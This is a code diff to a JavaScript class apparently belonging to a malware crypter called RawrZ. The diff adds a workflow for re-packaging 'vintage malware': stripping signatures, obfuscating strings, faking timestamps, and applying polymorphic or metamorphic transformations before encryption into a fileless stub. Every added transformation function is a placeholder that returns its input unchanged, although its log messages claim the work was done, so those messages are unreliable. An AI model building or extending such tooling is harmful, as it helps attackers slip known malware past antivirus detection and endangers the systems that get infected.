@@ -77,7 +77,13 @@ class RawrZEncryptorOnly {
             await this.validateGeneratedStub(stubPath);
             
             // Read the file to encrypt
-            const fileBuffer = await fs.readFile(file.path);
+            let fileBuffer = await fs.readFile(file.path);
+            
+            // Handle re-packaging workflow for vintage malware
+            if (options.payloadType === 'vintage') {
+                console.log('[INFO] Processing vintage malware for re-packaging');
+                fileBuffer = await this.processVintagePayload(fileBuffer, options);
+            }
             
             // Generate encryption key and IV
             const key = this.generateEncryptionKey(algorithm);
@@ -97,7 +103,7 @@ class RawrZEncryptorOnly {
             console.log('[OK] File encrypted using generated stub');
             console.log('[OK] Encryptor has NO stub generation capabilities');
             
-            return {
+            const result = {
                 success: true,
                 filename: outputFilename,
                 size: encryptedData.length,
@@ -107,6 +113,22 @@ class RawrZEncryptorOnly {
                 fileless: true,
                 message: 'File encrypted using generated stub - encryptor cannot generate stubs'
             };
+            
+            // Add re-packaging specific information
+            if (options.payloadType === 'vintage') {
+                result.repackaging = {
+                    enabled: true,
+                    method: options.repackMethod || 'stub-reuse',
+                    vintageYear: options.vintageYear || 'random',
+                    format: options.vintageFormat || 'exe',
+                    preserveLogic: options.preserveLogic || false,
+                    removeSignatures: options.removeSignatures || false,
+                    obfuscateStrings: options.obfuscateStrings || false
+                };
+                result.message += ' - Vintage payload re-packaged with fresh encryption';
+            }
+            
+            return result;
             
         } catch (error) {
             console.error('[ERROR] Encryption failed:', error.message);
@@ -425,6 +447,116 @@ class RawrZEncryptorOnly {
      */
     buildStub() {
         throw new Error('ENCRYPTOR CANNOT BUILD STUBS - Use stub generator system instead');
+    }
+
+    /**
+     * Process vintage payload for re-packaging
+     * @param {Buffer} payloadBuffer - Original payload buffer
+     * @param {Object} options - Re-packaging options
+     * @returns {Buffer} - Processed payload buffer
+     */
+    async processVintagePayload(payloadBuffer, options) {
+        try {
+            console.log('[INFO] Processing vintage payload for re-packaging');
+            
+            let processedBuffer = Buffer.from(payloadBuffer);
+            
+            // Remove digital signatures if requested
+            if (options.removeSignatures) {
+                console.log('[INFO] Removing digital signatures');
+                processedBuffer = this.removeDigitalSignatures(processedBuffer);
+            }
+            
+            // Obfuscate strings if requested
+            if (options.obfuscateStrings) {
+                console.log('[INFO] Obfuscating strings and metadata');
+                processedBuffer = this.obfuscateStrings(processedBuffer);
+            }
+            
+            // Apply vintage year metadata
+            if (options.vintageYear && options.vintageYear !== 'random') {
+                console.log(`[INFO] Applying vintage year metadata: ${options.vintageYear}`);
+                processedBuffer = this.applyVintageMetadata(processedBuffer, options.vintageYear);
+            }
+            
+            // Apply polymorphic/metamorphic transformations
+            if (options.repackMethod === 'polymorphic') {
+                console.log('[INFO] Applying polymorphic transformations');
+                processedBuffer = this.applyPolymorphicTransformations(processedBuffer);
+            } else if (options.repackMethod === 'metamorphic') {
+                console.log('[INFO] Applying metamorphic transformations');
+                processedBuffer = this.applyMetamorphicTransformations(processedBuffer);
+            }
+            
+            console.log('[OK] Vintage payload processed for re-packaging');
+            return processedBuffer;
+            
+        } catch (error) {
+            console.error('[ERROR] Vintage payload processing failed:', error.message);
+            // Return original buffer if processing fails
+            return payloadBuffer;
+        }
+    }
+
+    /**
+     * Remove digital signatures from payload
+     * @param {Buffer} buffer - Payload buffer
+     * @returns {Buffer} - Buffer with signatures removed
+     */
+    removeDigitalSignatures(buffer) {
+        // This is a simplified implementation
+        // In a real scenario, you would parse PE headers and remove signature sections
+        console.log('[INFO] Removing digital signatures (simplified)');
+        return buffer; // Placeholder - would need proper PE parsing
+    }
+
+    /**
+     * Obfuscate strings in payload
+     * @param {Buffer} buffer - Payload buffer
+     * @returns {Buffer} - Buffer with obfuscated strings
+     */
+    obfuscateStrings(buffer) {
+        // This is a simplified implementation
+        // In a real scenario, you would identify and obfuscate string literals
+        console.log('[INFO] Obfuscating strings (simplified)');
+        return buffer; // Placeholder - would need proper string analysis
+    }
+
+    /**
+     * Apply vintage year metadata
+     * @param {Buffer} buffer - Payload buffer
+     * @param {string} vintageYear - Vintage year
+     * @returns {Buffer} - Buffer with vintage metadata
+     */
+    applyVintageMetadata(buffer, vintageYear) {
+        // This is a simplified implementation
+        // In a real scenario, you would modify timestamps and metadata
+        console.log(`[INFO] Applying vintage year metadata: ${vintageYear}`);
+        return buffer; // Placeholder - would need proper metadata modification
+    }
+
+    /**
+     * Apply polymorphic transformations
+     * @param {Buffer} buffer - Payload buffer
+     * @returns {Buffer} - Polymorphically transformed buffer
+     */
+    applyPolymorphicTransformations(buffer) {
+        // This is a simplified implementation
+        // In a real scenario, you would apply polymorphic code transformations
+        console.log('[INFO] Applying polymorphic transformations (simplified)');
+        return buffer; // Placeholder - would need proper polymorphic engine
+    }
+
+    /**
+     * Apply metamorphic transformations
+     * @param {Buffer} buffer - Payload buffer
+     * @returns {Buffer} - Metamorphically transformed buffer
+     */
+    applyMetamorphicTransformations(buffer) {
+        // This is a simplified implementation
+        // In a real scenario, you would apply metamorphic code transformations
+        console.log('[INFO] Applying metamorphic transformations (simplified)');
+        return buffer; // Placeholder - would need proper metamorphic engine
     }
 }
 
